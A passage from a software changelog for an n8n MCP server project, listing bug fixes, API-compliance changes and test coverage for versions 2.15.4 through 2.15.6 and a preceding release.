  - **Fix**: Changed to nullish coalescing (`??`) operator to properly handle explicit `0` values
  - **Added**: Defensive array validation before index access
  - **Result**: Multi-output nodes now work reliably (rating improved 3/10 → 9/10)
  - **Test Coverage**: 6 comprehensive tests covering IF nodes, Switch nodes, and parallel execution

  **Bug #2: Server Crashes from Missing `updates` Object**
  - **Problem**: `updateConnection` without `updates` object caused server crash with "Cannot read properties of undefined"
  - **Impact**: Malformed requests from AI agents crashed the MCP server
  - **Fix**: Added runtime validation with comprehensive error message
  - **Error Message Quality**:
    - Shows what was provided (JSON.stringify of operation)
    - Explains what's wrong and why
    - Provides correct format with example
    - Suggests alternative approach (removeConnection + addConnection)
  - **Result**: No crashes, self-service troubleshooting enabled (rating improved 2/10 → 8/10)
  - **Test Coverage**: 2 tests for missing and invalid `updates` object

### Improved

- **Connection Operations Overall Experience**: 4.5/10 → 8.5/10 (+89% improvement)
- **Error Handling**: Helpful, actionable error messages instead of cryptic crashes
- **Documentation**: Updated tool docs with Phase 0 fix notes and new pitfall warnings
- **Developer Experience**: Better use of nullish coalescing, defensive programming patterns

### Test Coverage

- Total Tests: 126/126 passing (100%)
- New Tests: 8 comprehensive tests for Phase 0 fixes
- Coverage: 91.16% statements, 88.14% branches, 92.85% functions
- Test Quality: All edge cases covered, strong assertions, independent test isolation

### Technical Details

**Multi-Output Node Fix:**
```typescript
// Before (BROKEN):
const sourceIndex = operation.sourceIndex || 0;  // 0 treated as falsy!

// After (FIXED):
const sourceIndex = operation.sourceIndex ?? 0;  // explicit 0 preserved
```

**Runtime Validation Fix:**
```typescript
// Added comprehensive validation:
if (!operation.updates || typeof operation.updates !== 'object') {
  throw new Error(/* helpful 15-line error message */);
}
```

- Testing: Hands-on validation with n8n-mcp-tester agent
- Code Review: Comprehensive review against improvement plan

### Phase 1 Roadmap

Phase 0 addressed critical bugs. Future Phase 1 improvements planned:
- Add `rewireConnection` operation for intuitive connection rewiring
- Add smart parameters (`branch` for IF nodes, `case` for Switch nodes)
- Enhanced error messages with spell-checking
- Deprecation path for `updateConnection`

## [2.15.6] - 2025-10-05

### Fixed
- **Issue #269: Missing addNode Examples** - Added comprehensive examples for addNode operation in MCP tool documentation
  - Problem: Claude AI didn't know how to use addNode operation correctly due to zero examples in documentation
  - Solution: Added 4 progressive examples to `n8n_update_partial_workflow` tool documentation:
    1. Basic addNode (minimal configuration)
    2. Complete addNode (full parameters including typeVersion)
    3. addNode + addConnection combo (most common pattern)
    4. Batch operation (multiple nodes + connections)
  - Impact: AI assistants can now correctly use addNode without errors or trial-and-error

- **Issue #270: Apostrophes in Node Names** - Fixed workflow diff operations failing when node names contain special characters
  - Root Cause: `findNode()` method used exact string matching without normalization, causing escaped vs unescaped character mismatches
  - Example: Default Manual Trigger node name "When clicking 'Execute workflow'" failed when JSON-RPC sent escaped version "When clicking \\'Execute workflow\\'"
  - Solution: Added `normalizeNodeName()` helper that unescapes special characters (quotes, backslashes) and normalizes whitespace
  - Affected Operations: 8 operations fixed - addConnection, removeConnection, updateConnection, removeNode, updateNode, moveNode, enableNode, disableNode
  - Error Messages: Enhanced all validation methods with `formatNodeNotFoundError()` helper showing available nodes and suggesting node IDs for special characters
  - Duplicate Prevention: Fixed `validateAddNode()` to use normalization when checking for duplicate node names

### Changed
- **WorkflowDiffEngine String Normalization** - Enhanced to handle edge cases from code review
  - Regex Processing Order: Fixed critical bug - now processes backslashes BEFORE quotes (prevents multiply-escaped character failures)
  - Whitespace Handling: Comprehensive normalization of tabs, newlines, and mixed whitespace (prevents collision edge cases)
  - Documentation: Added detailed JSDoc warnings about normalization collision risks with examples
  - Best Practice: Documentation recommends using node IDs over names for special characters

### Technical Details
- **Normalization Algorithm**: 4-step process
  1. Trim leading/trailing whitespace
  2. Unescape backslashes (MUST be first!)
  3. Unescape single and double quotes
  4. Normalize all whitespace to single spaces
- **Error Message Format**: Now shows node IDs (first 8 chars) and suggests using IDs for special characters
- **Collision Prevention**: Duplicate checking uses same normalization to prevent subtle bugs

### Test Coverage
- Unit tests: 120/120 passing (up from 116)
- New test scenarios:
  - Tabs in node names
  - Newlines in node names
  - Mixed whitespace (tabs + newlines + spaces)
  - Escaped vs unescaped matching (core Issue #270 scenario)
- Coverage: 90.11% statements (up from 90.05%)

### Code Review
- All 6 MUST FIX and SHOULD FIX recommendations implemented:
  - ✅ Fixed regex processing order (critical bug)
  - ✅ Added comprehensive whitespace tests
  - ✅ Fixed duplicate checking normalization
  - ✅ Enhanced all 6 validation method error messages
  - ✅ Added comprehensive JSDoc documentation
  - ✅ Added escaped vs unescaped test case
- Final review: APPROVED FOR MERGE (production-ready)

### Impact
- **Workflow Operations**: All 8 affected operations now handle special characters correctly
- **User Experience**: Clear error messages with actionable suggestions
- **Reliability**: Comprehensive normalization prevents subtle bugs
- **Documentation**: Tool documentation updated to reflect fix (v2.15.6+)

## [2.15.5] - 2025-10-04

### Added
- **Phase 5 Integration Tests** - Comprehensive workflow management tests (16 scenarios)
  - `delete-workflow.test.ts`: 3 test scenarios
    - Successful deletion
    - Error handling for non-existent workflows
    - Cleanup verification (workflow actually deleted from n8n)
  - `list-workflows.test.ts`: 13 test scenarios
    - No filters (all workflows)
    - Filter by active status (true/false)
    - Pagination (first page, cursor, last page)
    - Limit variations (1, 50, 100)
    - Exclude pinned data
    - Empty results handling
    - Sort order consistency verification

### Fixed
- **handleDeleteWorkflow** - Now returns deleted workflow data in response
  - Before: Returned only success message
  - After: Returns deleted workflow object per n8n API specification
  - Impact: MCP tool consumers can access deleted workflow data for confirmation, logging, or undo operations

- **handleListWorkflows Tags Filter** - Fixed tags parameter format for n8n API compliance
  - Before: Sent tags as array `?tags[]=tag1&tags[]=tag2` (non-functional)
  - After: Converts to comma-separated string `?tags=tag1,tag2` per n8n OpenAPI spec
  - Impact: Tags filtering now works correctly when listing workflows
  - Implementation: `input.tags.join(',')` conversion in handler

- **N8nApiClient.deleteWorkflow** - Return type now matches n8n API specification
  - Before: `Promise<void>`
  - After: `Promise<Workflow>` (returns deleted workflow object)
  - Impact: Aligns with n8n API behavior where DELETE returns the deleted resource

### Changed
- **WorkflowListParams.tags** - Type changed for API compliance
  - Before: `tags?: string[] | null` (incorrect)
  - After: `tags?: string | null` (comma-separated string per n8n OpenAPI spec)
  - Impact: Type safety now matches actual API behavior

### Technical Details
- **API Compliance**: All fixes align with n8n OpenAPI specification
- **Backward Compatibility**: Handler maintains existing MCP tool interface (array input converted internally)
- **Type Safety**: TypeScript types now accurately reflect n8n API contracts

### Test Coverage
- Integration tests: 71/71 passing (Phase 1-5 complete)
- Total test scenarios across all phases: 87
- New coverage:
  - Workflow deletion: 3 scenarios
  - Workflow listing with filters: 13 scenarios

### Impact

- **API alignment**: Implementation correctly matches n8n OpenAPI specification
- **Test reliability**: All integration tests passing in CI

## [2.15.4] - 2025-10-04

### Fixed
- **Workflow Settings Updates** - Enhanced `cleanWorkflowForUpdate` to enable settings updates while maintaining Issue #248 protection
  - Changed from always overwriting settings with `{}` to filtering to whitelisted properties
  - Filters settings to OpenAPI spec whitelisted properties: `saveExecutionProgress`, `saveManualExecutions`, `saveDataErrorExecution`, `saveDataSuccessExecution`, `executionTimeout`, `errorWorkflow`, `timezone`, `executionOrder`
  - Removes unsafe properties like `callerPolicy` that cause "additional properties" API errors
  - Maintains backward compatibility: empty object `{}` still used when no settings provided
  - Resolves conflict between preventing Issue #248 errors and enabling legitimate settings updates

- **Phase 4 Integration Tests** - Fixed workflow update tests to comply with n8n API requirements
  - Updated all `handleUpdateWorkflow` tests to include required fields: `name`, `nodes`, `connections`, `settings`
  - Tests now fetch current workflow state before updates to obtain required fields
  - Removed invalid "Update Connections" test that attempted to set empty connections on multi-node workflow (architecturally invalid)
  - All 42 workflow update test scenarios now passing

### Changed
- **Settings Filtering Strategy** - Updated `cleanWorkflowForUpdate()` implementation
  - Before: Always set `settings = {}` (prevented all settings updates)
  - After: Filter to whitelisted properties (allows valid updates, blocks problematic ones)
  - Impact: Users can now update workflow settings via API while staying protected from validation errors

### Technical Details
- **Whitelist-based Filtering**: Implements principle of least privilege for settings properties
- **Reference**: Properties validated against n8n OpenAPI specification `workflowSettings` schema
- **Security**: More secure than blacklist approach (fails safe, unknown properties filtered)
- **Performance**: Filtering adds <1ms overhead per workflow update

### Test Coverage
- Unit tests: 72/72 passing (100% coverage for n8n-validation)
- Integration tests: 433/433 passing (Phase 4 complete)
- Test scenarios:
  - Settings filtering with safe/unsafe property combinations
  - Empty settings handling
  - Backward compatibility verification
  - Multi-node workflow connection validation

### Impact
- **Settings Updates**: Users can now update workflow settings (timezone, executionOrder, etc.) via API
- **Issue #248 Protection Maintained**: `callerPolicy` and other problematic properties still filtered
- **Test Reliability**: All Phase 4 integration tests passing in CI
- **API Compliance**: Tests correctly implement n8n API requirements for workflow updates
